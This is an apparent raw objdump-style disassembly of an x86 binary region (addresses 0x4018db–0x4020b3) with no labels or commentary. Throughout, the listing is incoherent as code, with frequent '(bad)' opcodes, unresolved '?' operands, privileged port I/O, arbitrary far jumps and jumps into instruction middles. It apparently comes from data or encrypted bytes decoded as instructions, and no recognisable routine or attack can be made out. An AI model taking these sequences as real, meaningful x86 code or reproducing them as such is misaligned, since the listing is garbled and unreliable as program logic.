  4018db:	mov    dh,0x17
  4018dd:	sub    eax,0x82ed88d9
  4018e2:	add    al,0x3b
  4018e4:	and    DWORD PTR [ebx+0x2b],esi
  4018e7:	push   esi
  4018e8:	ins    DWORD PTR es:[edi],dx
  4018e9:	mov    esi,ebx
  4018eb:	dec    edx
  4018ec:	outs   dx,DWORD PTR ds:[esi]
  4018ed:	mov    ebx,0x171ba487
  4018f2:	addr16 imul ah
  4018f5:	bound  ecx,QWORD PTR [edx+0x6a]
  4018f8:	mov    eax,0xb04d6bee
  4018fd:	sar    DWORD PTR [esi+0x61],cl
  401900:	and    al,BYTE PTR [edi+ebp*8+0x4d]
  401904:	push   esi
  401905:	dec    ecx
  401906:	dec    ebp
  401907:	mov    BYTE PTR [esi],cl
  401909:	(bad)  
  40190b:	std    
  40190c:	and    ebx,eax
  40190e:	cmp    esp,DWORD PTR [ebp+esi*8+0x6c40317f]
  401915:	cli    
  401916:	sar    esi,cl
  401918:	xor    DWORD PTR [edx],esi
  40191a:	pop    edx
  40191b:	stos   DWORD PTR es:[edi],eax
  40191c:	jmp    0x13d3:0xc273eaa7
  401923:	jecxz  0x4018b7
  401925:	lods   eax,DWORD PTR ds:[esi]
  401926:	dec    ebp
  401927:	scas   al,BYTE PTR es:[edi]
  401928:	loope  0x4018cc
  40192a:	and    DWORD PTR [ebx+0x5a],edx
  40192d:	xchg   edi,eax
  40192e:	sti    
  40192f:	inc    edi
  401930:	and    BYTE PTR [ebx],ch
  401932:	mov    WORD PTR [eax+0x268d1e32],gs
  401938:	ret    0x1771
  40193b:	daa    
  40193c:	popf   
  40193d:	inc    edi
  40193e:	or     al,0x88
  401940:	add    eax,0xf10adb35
  401945:	push   edx
  401946:	jge    0x4018d0
  401948:	xor    edx,esi
  40194a:	repz imul edi,DWORD PTR [eax],0x66b9aff6
  401951:	ins    BYTE PTR es:[edi],dx
  401952:	imul   ebp
  401954:	not    DWORD PTR [eax+0x5c897010]
  40195a:	push   ecx
  40195b:	jnp    0x401954
  40195d:	xor    BYTE PTR [ebx-0x3e5365c1],bl
  401963:	mov    edi,?
  401965:	clc    
  401966:	jle    0x4018f6
  401968:	iret   
  401969:	adc    ecx,ecx
  40196b:	popf   
  40196c:	add    DWORD PTR ds:0x8a0537c3,ebx
  401972:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401973:	sahf   
  401974:	in     eax,dx
  401975:	das    
  401976:	cmp    DWORD PTR [edi+0x76],esp
  401979:	and    DWORD PTR [edx+0x3e],0xffffffc4
  40197d:	ror    ebx,1
  40197f:	mov    ebx,0x734860d0
  401984:	add    esp,edi
  401986:	cmc    
  401987:	xchg   edx,eax
  401988:	retf   
  401989:	inc    edi
  40198a:	push   ss
  40198b:	add    BYTE PTR [ebx-0x18],al
  40198e:	jmp    0xc5ed:0xc557a400
  401995:	mov    ss,WORD PTR [edi+0x195a3943]
  40199b:	dec    eax
  40199c:	mov    esp,0x38accc61
  4019a1:	and    BYTE PTR [ebx],bl
  4019a3:	fiadd  WORD PTR [ecx+0x50]
  4019a6:	test   DWORD PTR [ebp-0x4d],esi
  4019a9:	or     ah,dl
  4019ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019ac:	js     0x40199d
  4019ae:	mov    ?,WORD PTR [ebx-0x3f]
  4019b1:	cmp    DWORD PTR [edx],edi
  4019b3:	test   DWORD PTR [esi-0x2ea6eb81],edx
  4019b9:	fsubr  st,st(7)
  4019bb:	pop    ds
  4019bc:	(bad)  
  4019bd:	pop    ebx
  4019be:	(bad)  
  4019c1:	mov    esp,0xc7a28e4
  4019c6:	mov    DWORD PTR [eax+ecx*2],edx
  4019c9:	pop    esp
  4019ca:	call   0xde81583c
  4019cf:	pop    es
  4019d0:	mov    WORD PTR [edx-0x7d],ss
  4019d3:	pop    ebx
  4019d4:	pop    edx
  4019d5:	adc    al,0xa
  4019d7:	pop    eax
  4019d8:	jp     0x4019ef
  4019da:	push   es
  4019db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019dc:	out    dx,al
  4019dd:	pop    eax
  4019de:	aaa    
  4019df:	and    eax,0xad4ae683
  4019e4:	fcmove st,st(7)
  4019e6:	or     ebp,ebx
  4019e8:	mov    WORD PTR [eax+0x3fc86605],ds
  4019ee:	push   cs
  4019ef:	xchg   ecx,eax
  4019f0:	mov    bl,0x6b
  4019f2:	ror    BYTE PTR [edi],0xe0
  4019f5:	jb     0x401979
  4019f7:	cdq    
  4019f8:	cs push 0xa1cfed85
  4019fe:	jae    0x4019f2
  401a00:	push   esi
  401a01:	(bad)  
  401a02:	rcl    DWORD PTR [ebp+0x49c118f7],cl
  401a08:	inc    edi
  401a09:	int3   
  401a0a:	(bad)  
  401a0b:	pop    ebp
  401a0c:	xor    al,0xf5
  401a0e:	out    0x45,al
  401a10:	cwde   
  401a11:	mov    esi,0x59602f10
  401a16:	sar    ebx,1
  401a18:	jmp    0xecf:0x726dee6b
  401a1f:	xchg   bh,cl
  401a21:	shl    bh,0x2b
  401a24:	test   BYTE PTR [ecx],cl
  401a26:	int3   
  401a27:	xor    eax,0xc1353181
  401a2c:	js     0x401a74
  401a2e:	std    
  401a2f:	popa   
  401a30:	fisttp QWORD PTR [edi-0x7f]
  401a33:	push   ebx
  401a34:	pop    ss
  401a35:	add    BYTE PTR [ebp+0x7b],al
  401a38:	mov    edx,0x5c05734f
  401a3d:	aas    
  401a3e:	push   esi
  401a3f:	sub    eax,0xb91c980d
  401a44:	sub    BYTE PTR [edi+0x665f62f1],ch
  401a4a:	retf   
  401a4b:	xor    al,0x58
  401a4d:	pop    edi
  401a4e:	sub    BYTE PTR [eax+edx*2-0x75cfe37d],bl
  401a55:	jp     0x401aa1
  401a57:	fcmovne st,st(7)
  401a59:	push   es
  401a5a:	xchg   ebx,eax
  401a5b:	add    BYTE PTR [edx-0xb],cl
  401a5e:	jg     0x401a92
  401a60:	mov    edi,0x13d1ed4d
  401a65:	pop    es
  401a66:	cmp    eax,0x4af955f
  401a6b:	sbb    dl,bl
  401a6d:	push   esi
  401a6e:	nop
  401a6f:	adc    edx,ebx
  401a71:	std    
  401a72:	pop    edx
  401a73:	mov    ebx,0x9fffc630
  401a78:	xchg   ecx,eax
  401a79:	mov    edi,0xc8edcfeb
  401a7e:	push   0xfd368997
  401a83:	xchg   BYTE PTR [edx],dh
  401a85:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a87:	sub    esi,esp
  401a89:	xchg   ecx,eax
  401a8a:	mov    ch,0x38
  401a8c:	or     eax,0xff6ae09d
  401a91:	xchg   ebp,eax
  401a92:	mov    eax,0xcda4ef56
  401a97:	inc    edi
  401a98:	pop    ss
  401a99:	out    dx,eax
  401a9a:	or     edx,DWORD PTR [ebp-0x62f65dda]
  401aa0:	adc    DWORD PTR [ebp+0x368e24ed],eax
  401aa6:	add    esp,DWORD PTR [edi+0x5b]
  401aa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401aaa:	retf   0x8d56
  401aad:	sbb    DWORD PTR [ebx+0x472392b8],edi
  401ab3:	jmp    DWORD PTR [ebx-0x3eb8f710]
  401ab9:	addr16 lahf 
  401abb:	jmp    0x401b25
  401abd:	ds xchg edi,eax
  401abf:	retf   
  401ac0:	int    0xe5
  401ac2:	imul   ecx,DWORD PTR [ecx-0x2b],0x66
  401ac6:	imul   DWORD PTR ds:0xac1e7547
  401acc:	adc    al,0xff
  401ace:	sbb    eax,esi
  401ad0:	sub    DWORD PTR [ebp-0x3017600d],eax
  401ad6:	cmc    
  401ad7:	mov    cl,0x51
  401ad9:	rol    eax,0x12
  401adc:	shl    BYTE PTR [ecx-0x2ccfe227],cl
  401ae2:	adc    BYTE PTR [ebp-0x6f],al
  401ae5:	sbb    edi,DWORD PTR [eax-0x2cc966c1]
  401aeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401aec:	repnz cdq 
  401aee:	cmp    eax,DWORD PTR [ebx]
  401af0:	dec    ebx
  401af1:	xor    DWORD PTR [ebx],0x4d
  401af4:	rcl    DWORD PTR [edx-0x748f9ba5],1
  401afa:	pop    ebp
  401afb:	fistp  DWORD PTR [ebp-0x3b766a3a]
  401b01:	or     DWORD PTR [ebx+0x7602c50e],edi
  401b07:	imul   ebx,ecx,0x55961e50
  401b0d:	mov    al,0xc4
  401b0f:	sbb    al,BYTE PTR [edx+0x68]
  401b12:	loop   0x401b32
  401b14:	ficomp WORD PTR ds:0x96ad15e1
  401b1a:	mov    bh,BYTE PTR [eax]
  401b1c:	gs jle 0x401ac3
  401b1f:	scas   al,BYTE PTR es:[edi]
  401b20:	retf   
  401b21:	add    al,0x83
  401b23:	and    edx,DWORD PTR [eax+0x4629f785]
  401b29:	jg     0x401b52
  401b2b:	std    
  401b2c:	and    eax,0x668593ea
  401b31:	sbb    dh,BYTE PTR [eax-0x20]
  401b34:	aam    0xc6
  401b36:	mov    edx,0x2e923e36
  401b3b:	in     eax,0x99
  401b3d:	fiadd  WORD PTR [ebx]
  401b3f:	ins    DWORD PTR es:[edi],dx
  401b40:	xbegin 0x8bb99429
  401b46:	jge    0x401b4e
  401b48:	retf   
  401b49:	mov    ecx,0xa4cbe6c0
  401b4e:	inc    edi
  401b4f:	cmc    
  401b50:	xor    DWORD PTR [eax+0x9ae891e],edi
  401b56:	jnp    0x401bb5
  401b58:	scas   eax,DWORD PTR es:[edi]
  401b59:	cmp    eax,0x59d6fc5c
  401b5e:	xchg   edi,eax
  401b5f:	jnp    0x401b26
  401b61:	repz push esp
  401b63:	cmp    BYTE PTR [ebx+0x37f5e44d],dh
  401b69:	fs in  eax,0xd2
  401b6c:	sub    al,bl
  401b6e:	adc    dh,BYTE PTR [esi]
  401b70:	dec    esi
  401b71:	pop    ds
  401b72:	xchg   BYTE PTR [ebx+0x3cc2eb5a],ch
  401b78:	jmp    0x401b8f
  401b7a:	mov    ds:0xc3310c46,al
  401b7f:	jle    0x401bb7
  401b81:	out    dx,eax
  401b82:	call   0x4743fbe5
  401b87:	sub    DWORD PTR [edx+eiz*8-0x7249dd03],0xffffffa5
  401b8f:	and    al,0xc6
  401b91:	fdiv   DWORD PTR [ebx+0x55]
  401b94:	push   ds
  401b95:	(bad)  
  401b96:	ret    
  401b97:	sbb    edx,esi
  401b99:	jg     0x401bb4
  401b9b:	dec    esp
  401b9c:	jmp    0x401b28
  401b9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b9f:	mov    eax,0x458ea715
  401ba4:	stos   DWORD PTR es:[edi],eax
  401ba5:	adc    eax,0xa715acb4
  401baa:	mov    bh,0xe2
  401bac:	lea    esp,[eax-0x2a]
  401baf:	inc    eax
  401bb0:	or     eax,ebx
  401bb2:	inc    esp
  401bb3:	mov    eax,0xd5c03707
  401bb8:	clc    
  401bb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bba:	add    DWORD PTR [ecx-0x6903fbb4],0xafbbb778
  401bc4:	push   ebx
  401bc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bc6:	repnz pop ebp
  401bc8:	mov    WORD PTR [ecx+ebp*4+0x11],es
  401bcc:	repnz mov bh,0x32
  401bcf:	sbb    bh,BYTE PTR [edx-0x247af912]
  401bd5:	std    
  401bd6:	mov    ebp,0x7c9c4ee4
  401bdb:	aam    0xc0
  401bdd:	sbb    DWORD PTR [ebp-0x21de5d63],ebp
  401be3:	xor    al,0x15
  401be5:	dec    eax
  401be6:	nop
  401be7:	push   edx
  401be8:	sbb    cl,ch
  401bea:	mov    ebx,0x8040b4d0
  401bef:	jo     0x401c4f
  401bf1:	dec    edx
  401bf2:	(bad)  
  401bf3:	jg     0x401c21
  401bf5:	fmul   DWORD PTR [edi+eax*4]
  401bf8:	ss push 0x48abb1e7
  401bfe:	call   DWORD PTR [eax+0x4ede5d74]
  401c04:	jecxz  0x401be3
  401c06:	sbb    DWORD PTR [ebx+0x7c3fcd69],0xd1771b06
  401c10:	xchg   ebp,eax
  401c11:	stos   DWORD PTR es:[edi],eax
  401c12:	fmul   st(3),st
  401c14:	mov    edi,0x554848da
  401c19:	in     eax,dx
  401c1a:	loopne 0x401c0f
  401c1c:	in     al,dx
  401c1d:	cmp    BYTE PTR [edx-0x59b43902],0xb6
  401c24:	add    ch,0x35
  401c27:	cmp    eax,0x1
  401c2a:	(bad)  
  401c2b:	ds jge 0x401c21
  401c2e:	mov    esi,0x69f5a428
  401c33:	and    al,0x29
  401c35:	retf   
  401c36:	pop    eax
  401c37:	(bad)  
  401c38:	pusha  
  401c39:	inc    ecx
  401c3a:	arpl   WORD PTR [ebp-0xa5daca1],cx
  401c40:	pop    ss
  401c41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c42:	neg    esi
  401c44:	enter  0xa2b7,0x85
  401c48:	sub    DWORD PTR [ecx+0x19],edi
  401c4b:	mov    dl,0x32
  401c4d:	addr16 add eax,0xfcc15835
  401c53:	and    BYTE PTR [eax+0x19],al
  401c56:	repnz imul ecx,DWORD PTR [edi-0x351b3acd],0xffffff8d
  401c5e:	loop   0x401c37
  401c60:	out    0x22,al
  401c62:	add    BYTE PTR [ebp+0x3a],cl
  401c65:	pop    ecx
  401c66:	loop   0x401cc2
  401c68:	test   al,0xf1
  401c6a:	in     al,dx
  401c6b:	and    DWORD PTR [ebp-0x2b],edx
  401c6e:	mov    edi,0x24fc0730
  401c73:	clc    
  401c74:	lea    ebp,[eax+0x696f76d0]
  401c7a:	aad    0x3c
  401c7c:	scas   eax,DWORD PTR es:[edi]
  401c7d:	out    0xdc,al
  401c7f:	jecxz  0x401ccc
  401c81:	scas   eax,DWORD PTR es:[edi]
  401c82:	jns    0x401c5c
  401c84:	cmp    DWORD PTR [ebp-0xa],esi
  401c87:	mov    ?,WORD PTR [ebx]
  401c89:	popf   
  401c8a:	mov    ds:0x84f0b778,eax
  401c8f:	ins    BYTE PTR es:[edi],dx
  401c90:	pushf  
  401c91:	sbb    BYTE PTR [ecx+0x71],0x44
  401c95:	push   ebx
  401c96:	outs   dx,DWORD PTR ds:[esi]
  401c97:	fistp  DWORD PTR [eax]
  401c99:	lea    eax,[ebp-0x9d2e600]
  401c9f:	jo     0x401cdb
  401ca1:	cmc    
  401ca2:	pop    eax
  401ca3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ca4:	(bad)  
  401ca5:	addr16 pushf 
  401ca7:	push   0xe41d7718
  401cac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401cad:	dec    esp
  401cae:	jae    0x401cff
  401cb0:	jl     0x401cbc
  401cb2:	rol    BYTE PTR [eax-0x24d3e9ef],0x59
  401cb9:	adc    WORD PTR [eax],dx
  401cbc:	repnz mov edi,0x47885a44
  401cc2:	(bad)  
  401cc3:	sub    eax,0x3fdc3d3b
  401cc8:	in     eax,0x7
  401cca:	neg    BYTE PTR [ecx]
  401ccc:	jg     0x401c8b
  401cce:	jnp    0x401d00
  401cd0:	addr16 mov ch,0xc5
  401cd3:	push   ebx
  401cd4:	add    DWORD PTR [ecx+0x3d],edi
  401cd7:	aaa    
  401cd8:	inc    ecx
  401cd9:	xchg   ebx,ebx
  401cdb:	addr16 loope 0x401ce3
  401cde:	mov    al,0x33
  401ce0:	xchg   edi,eax
  401ce1:	mov    bl,0xff
  401ce3:	add    eax,eax
  401ce5:	je     0x401c69
  401ce7:	mov    WORD PTR [eax-0x80],fs
  401cea:	call   DWORD PTR [edi+0x78]
  401ced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cee:	sbb    BYTE PTR ds:0xc5bf05d3,0x14
  401cf5:	mov    ds:0x6b5b6234,al
  401cfa:	push   0x7e
  401cfc:	and    ebx,DWORD PTR [edx+eiz*2]
  401cff:	push   cs
  401d00:	xchg   esp,eax
  401d01:	jb     0x401cb9
  401d03:	cmc    
  401d04:	inc    ebp
  401d05:	pop    edx
  401d06:	dec    esi
  401d07:	and    eax,0x19aad253
  401d0c:	sub    edx,esi
  401d0e:	add    BYTE PTR [ebx-0x195ddfd],cl
  401d14:	sub    eax,DWORD PTR [ebx+ebx*1-0x2ba29b89]
  401d1b:	inc    ebp
  401d1c:	xchg   esp,eax
  401d1d:	mov    al,BYTE PTR [ebx+edi*4+0xd]
  401d21:	imul   esi,DWORD PTR [edx+esi*2],0xc3934ae4
  401d28:	add    BYTE PTR [eax+eax*2+0x25],dl
  401d2c:	adc    BYTE PTR [esi+0x18e6970f],dl
  401d32:	retf   0x94fb
  401d35:	dec    esi
  401d36:	shr    al,0xc6
  401d39:	pop    ebp
  401d3a:	push   ebx
  401d3b:	adc    BYTE PTR [edx+0x5d],0xdd
  401d3f:	xor    ebx,DWORD PTR [ebx-0x18]
  401d42:	ins    BYTE PTR es:[edi],dx
  401d43:	cmc    
  401d44:	dec    eax
  401d45:	(bad)  
  401d46:	or     al,0x54
  401d48:	xor    al,0x11
  401d4a:	mov    BYTE PTR [edx-0x74012aea],ah
  401d50:	ins    BYTE PTR es:[edi],dx
  401d51:	ds sub eax,0xaa07135d
  401d57:	dec    esp
  401d58:	jle    0x401dd1
  401d5a:	mov    ebx,0x66ba604
  401d5f:	addr16 jne 0x401db0
  401d62:	in     eax,0xd5
  401d64:	mov    ebx,esi
  401d66:	inc    eax
  401d67:	sub    al,0x10
  401d69:	sbb    eax,DWORD PTR [ecx]
  401d6b:	fmul   DWORD PTR [esi-0x6ce81e95]
  401d71:	add    ebp,DWORD PTR [ebx]
  401d73:	add    eax,0x1a1fe40c
  401d78:	xor    ebp,ecx
  401d7a:	xor    dh,BYTE PTR [edi]
  401d7c:	lock clc 
  401d7e:	(bad)
  401d82:	cwde   
  401d83:	or     cl,BYTE PTR [ecx+ebx*1]
  401d86:	or     BYTE PTR [eax+eax*8],ah
  401d89:	and    eax,0x9ab46b5d
  401d8e:	loope  0x401d71
  401d90:	cmp    dl,BYTE PTR [esi-0x6820dbba]
  401d96:	xchg   BYTE PTR [ebp-0x49],dl
  401d99:	in     al,dx
  401d9a:	loopne 0x401dd6
  401d9c:	clc    
  401d9d:	adc    DWORD PTR ds:0xc51541e6,ebp
  401da3:	scas   al,BYTE PTR es:[edi]
  401da4:	mov    esp,0x2559512e
  401da9:	push   ebx
  401daa:	popa   
  401dab:	(bad)  
  401dad:	call   0xa97fa2a6
  401db2:	cmc    
  401db3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401db4:	mov    ebx,0xa4c6aec5
  401db9:	cmp    BYTE PTR [ebp+ecx*4+0x52],al
  401dbd:	push   ecx
  401dbe:	pop    esi
  401dbf:	jmp    esp
  401dc1:	mov    ss,WORD PTR [eax-0x59]
  401dc4:	fs popf 
  401dc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401dc7:	and    ch,BYTE PTR [edx]
  401dc9:	push   cs
  401dca:	pop    ebx
  401dcb:	repz pop ecx
  401dcd:	push   ss
  401dce:	xor    bl,bh
  401dd0:	jg     0x401e15
  401dd2:	add    esi,DWORD PTR [edi-0x77]
  401dd5:	leave  
  401dd6:	sbb    al,0xb1
  401dd8:	pop    esi
  401dd9:	lahf   
  401dda:	les    ecx,FWORD PTR [eax]
  401ddc:	test   dh,ah
  401dde:	jmp    0x401e41
  401de0:	retf   0x2b97
  401de3:	and    eax,0x20bdf291
  401de8:	jb     0x401e38
  401dea:	fisub  WORD PTR [edi+0x1c]
  401ded:	sub    esi,DWORD PTR [edi+0x462dfc52]
  401df3:	push   ecx
  401df4:	jg     0x401e1f
  401df6:	lods   al,BYTE PTR ds:[esi]
  401df7:	mov    ds:0x89d0ad8c,eax
  401dfc:	xchg   ecx,eax
  401dfd:	mov    al,ds:0x3f336565
  401e02:	dec    ebx
  401e03:	fist   DWORD PTR [ebx+ebp*8]
  401e06:	aas    
  401e07:	lds    ebp,FWORD PTR [ebx-0x27]
  401e0a:	in     al,dx
  401e0b:	ucomiss xmm4,xmm4
  401e0e:	bound  eax,QWORD PTR [edi-0x65c2b168]
  401e14:	das    
  401e15:	cs jge 0x401e36
  401e18:	lahf   
  401e19:	adc    al,BYTE PTR [ebp-0x51]
  401e1c:	dec    edi
  401e1d:	call   0xd06:0xc2395611
  401e24:	add    dh,BYTE PTR [edx-0x23]
  401e27:	xchg   ebx,eax
  401e28:	jge    0x401e55
  401e2a:	xchg   esi,eax
  401e2b:	jo     0x401e05
  401e2d:	xchg   cl,al
  401e2f:	jl     0x401e4c
  401e31:	jns    0x401e4d
  401e33:	sbb    eax,0x12a3b89f
  401e38:	sahf   
  401e39:	cmc    
  401e3a:	sub    al,0x26
  401e3c:	push   ebx
  401e3d:	cmc    
  401e3e:	in     eax,0x82
  401e40:	jmp    0x5e56:0xdda6a5f5
  401e47:	jmp    0xce89:0x715d9c1a
  401e4e:	pop    ebp
  401e4f:	sahf   
  401e50:	(bad)  
  401e51:	hlt    
  401e52:	jns    0x401e26
  401e54:	or     ah,BYTE PTR [esi+0xa368466]
  401e5a:	hlt    
  401e5b:	dec    DWORD PTR [ebx-0x5e]
  401e5e:	inc    ecx
  401e5f:	push   edx
  401e60:	popf   
  401e61:	fild   WORD PTR [ecx]
  401e63:	or     al,BYTE PTR [ebx+0x2621eb81]
  401e69:	add    al,0x71
  401e6b:	mov    bh,0x92
  401e6d:	push   eax
  401e6e:	(bad)  
  401e6f:	and    al,bh
  401e71:	and    al,0xb0
  401e73:	xor    esi,edx
  401e75:	xchg   BYTE PTR [ebx-0x7f],cl
  401e78:	xchg   esi,eax
  401e79:	cdq    
  401e7a:	push   ecx
  401e7b:	jp     0x401e0c
  401e7d:	clc    
  401e7e:	retf   
  401e7f:	cmp    eax,0xfb47c3a7
  401e84:	fisub  WORD PTR [edx]
  401e86:	fdivr  DWORD PTR ds:[eax]
  401e89:	int3   
  401e8a:	mov    ds:0xdb89b627,al
  401e8f:	or     eax,0x38146d33
  401e94:	xor    ecx,edi
  401e96:	mov    bl,0x76
  401e98:	lds    ebp,FWORD PTR [ebx+ebx*2-0x759eb085]
  401e9f:	cmp    ebp,DWORD PTR [ebp-0x4e]
  401ea2:	pusha  
  401ea3:	pusha  
  401ea4:	xor    BYTE PTR [ebp+eiz*1-0x6a],bh
  401ea8:	(bad)  
  401ea9:	sar    BYTE PTR [ecx],1
  401eab:	mov    eax,0x8808afbf
  401eb1:	ss push edx
  401eb3:	shr    edi,0x9a
  401eb6:	mov    ecx,0x7be6748b
  401ebb:	inc    edx
  401ebc:	out    0xfc,eax
  401ebe:	pop    ebp
  401ebf:	sahf   
  401ec0:	int3   
  401ec1:	aas    
  401ec2:	es sub eax,0x18a5670d
  401ec8:	and    al,0xa4
  401eca:	mov    cl,bh
  401ecc:	mov    ecx,0x6b5d501
  401ed1:	fnstenv [ebp-0x13]
  401ed4:	pop    ds
  401ed5:	inc    edi
  401ed6:	xor    DWORD PTR [edx+0x70],ebx
  401ed9:	js     0x401f36
  401edb:	lock inc ebp
  401edd:	fwait
  401ede:	inc    edx
  401edf:	aas    
  401ee0:	repz jne 0x401f26
  401ee3:	xchg   ebp,eax
  401ee4:	inc    ebp
  401ee5:	mov    esp,0xaaf7cf6c
  401eea:	and    eax,DWORD PTR [ecx-0x13]
  401eed:	add    DWORD PTR [ecx-0x194929c4],esp
  401ef3:	sti    
  401ef4:	fisttp DWORD PTR ds:0x5580e75c
  401efa:	xchg   esi,eax
  401efb:	test   BYTE PTR [ebx-0x2e3ffc78],dh
  401f01:	add    cl,BYTE PTR [ecx+0x71a306df]
  401f07:	pop    es
  401f08:	push   eax
  401f09:	adc    eax,0x408b4db5
  401f0e:	popa   
  401f0f:	mov    bl,0x4f
  401f11:	cdq    
  401f12:	ficom  WORD PTR [ebx-0x1438207c]
  401f18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f19:	jmp    0x83a5:0x74e6dc1
  401f20:	test   DWORD PTR [esi-0x5af30ae6],esi
  401f26:	pop    ebp
  401f27:	xchg   edx,eax
  401f28:	int    0xe4
  401f2a:	jmp    0xcb96d1a8
  401f2f:	dec    edx
  401f30:	and    al,ch
  401f32:	jne    0x401f8c
  401f34:	loop   0x401fb1
  401f36:	push   ebp
  401f37:	repnz retf 0xbdc5
  401f3b:	sub    dl,BYTE PTR [esi+esi*2-0x1ffba96b]
  401f42:	shr    esi,cl
  401f44:	daa    
  401f45:	call   0xa82478d8
  401f4a:	mov    al,0xc6
  401f4c:	aas    
  401f4d:	pop    ebp
  401f4e:	cdq    
  401f4f:	in     eax,dx
  401f50:	mov    ah,0x7a
  401f52:	push   ebp
  401f53:	sbb    al,0x92
  401f55:	or     BYTE PTR [edx+0x30],ch
  401f58:	jp     0x401f53
  401f5a:	mov    bh,0x99
  401f5c:	lds    esp,FWORD PTR ds:0x758dc17f
  401f62:	rcl    DWORD PTR [ecx+0x6acb3b03],0x87
  401f69:	test   al,0xae
  401f6b:	ret    0x196d
  401f6e:	les    edx,FWORD PTR [ebx+eax*8]
  401f71:	mov    BYTE PTR [esi],al
  401f73:	mov    ch,0xa6
  401f75:	test   BYTE PTR [edi-0x6b24dae7],0x2c
  401f7c:	sub    esi,edx
  401f7e:	scas   eax,DWORD PTR es:[edi]
  401f7f:	mov    ah,BYTE PTR [ebx]
  401f81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f82:	xor    DWORD PTR [eax],esp
  401f84:	jp     0x401f12
  401f86:	mov    dh,BYTE PTR [esi]
  401f88:	mov    BYTE PTR [ecx+0x1056b1d0],al
  401f8e:	mov    ?,WORD PTR [ebp+eiz*2-0x5e0851f7]
  401f95:	cdq    
  401f96:	int3   
  401f97:	out    0xa5,al
  401f99:	dec    ebp
  401f9a:	shl    dh,0xb0
  401f9d:	xor    DWORD PTR [edi],ebx
  401f9f:	sbb    eax,0x74677b8a
  401fa4:	imul   ebx,esp,0xf
  401fa7:	(bad)  
  401fa8:	jp     0x401fa4
  401faa:	xchg   edx,eax
  401fab:	xchg   esp,eax
  401fac:	mov    WORD PTR [edi+0x5f11d724],es
  401fb2:	push   esi
  401fb3:	push   esp
  401fb4:	or     ebx,ebx
  401fb6:	adc    ecx,0xb13b148
  401fbc:	fdiv   QWORD PTR [edx+0x475494e0]
  401fc2:	fiadd  DWORD PTR [esi]
  401fc4:	cmp    al,0x8c
  401fc6:	fdivr  st(4),st
  401fc8:	dec    ecx
  401fc9:	cs call 0xeb67:0xb4de9041
  401fd1:	sbb    al,0x98
  401fd3:	sbb    al,0xae
  401fd5:	outs   dx,DWORD PTR ds:[esi]
  401fd6:	ret    0xe15f
  401fd9:	ins    DWORD PTR es:[edi],dx
  401fda:	enter  0xc8f8,0xa4
  401fde:	mov    cl,0xcb
  401fe0:	popf   
  401fe1:	pushf  
  401fe2:	stc    
  401fe3:	cmc    
  401fe4:	jbe    0x401fb7
  401fe6:	nop
  401fe7:	(bad)  
  401fe8:	bound  eax,QWORD PTR [eax+0x48]
  401feb:	jl     0x401f90
  401fed:	popa   
  401fee:	dec    eax
  401fef:	lods   al,BYTE PTR ds:[esi]
  401ff0:	dec    ah
  401ff2:	rol    DWORD PTR [ecx+ebx*1+0x4529016b],0xbd
  401ffa:	or     eax,0x5b5572e4
  401fff:	add    ah,dh
  402001:	or     DWORD PTR [ecx+eax*8+0x11],esi
  402005:	mov    dh,0xab
  402007:	pop    ds
  402008:	fidivr DWORD PTR [ebx+0x26]
  40200b:	test   al,bh
  40200d:	cmp    cl,BYTE PTR [edi]
  40200f:	call   0x9af07257
  402014:	loopne 0x401fe6
  402016:	mov    edi,0xc1b4cb4e
  40201b:	push   ds
  40201c:	int3   
  40201d:	xchg   edx,eax
  40201e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40201f:	js     0x402031
  402021:	xor    DWORD PTR [eax],ebx
  402023:	nop
  402024:	mov    al,ds:0xb6563ac7
  402029:	xor    ecx,DWORD PTR [edx]
  40202b:	pop    esi
  40202c:	push   esp
  40202d:	pop    ss
  40202e:	or     DWORD PTR [ebp+0x235f0235],eax
  402034:	mov    ecx,0x92c03fda
  402039:	cs test dh,dl
  40203c:	pop    esi
  40203d:	daa    
  40203e:	fsubr  st(5),st
  402040:	ret    
  402041:	shl    BYTE PTR ds:0xe7763018,0x3e
  402048:	gs imul edi,ebp,0x21
  40204c:	sub    eax,0xa15e5a1e
  402051:	adc    dl,BYTE PTR [esi+0x62]
  402054:	xchg   ecx,eax
  402055:	jmp    0xc745916a
  40205a:	(bad)  
  40205b:	sbb    DWORD PTR [esi],0x67dc31dc
  402061:	sub    DWORD PTR [edx],0xb5296e8a
  402067:	push   cs
  402068:	(bad)  
  402069:	js     0x40201f
  40206b:	out    dx,eax
  40206c:	adc    eax,0x1d6d4154
  402071:	and    esi,DWORD PTR [ebp+0x5988abcb]
  402077:	int    0xdd
  402079:	fwait
  40207a:	sbb    BYTE PTR [edx-0x57ffb3e1],bh
  402080:	int    0x53
  402082:	and    al,0x74
  402084:	test   ah,ah
  402086:	jo     0x40209f
  402088:	mov    esi,0x23f16540
  40208d:	data16 jp 0x4020ff
  402090:	inc    ebp
  402091:	push   0xfffffffc
  402093:	inc    bp
  402095:	loope  0x4020c4
  402097:	test   DWORD PTR [edi-0x9befc45],0x81fb32dd
  4020a1:	dec    ecx
  4020a2:	pop    ebx
  4020a3:	mov    cl,0x2d
  4020a5:	(bad)  
  4020a6:	pusha  
  4020a7:	mov    ah,BYTE PTR [edi]
  4020a9:	scas   al,BYTE PTR es:[edi]
  4020aa:	sti    
  4020ab:	inc    edx
  4020ac:	ret    0xd559
  4020af:	mov    edx,DWORD PTR [edi+0x29]
  4020b2:	sti    
  4020b3:	in     eax,0xe9
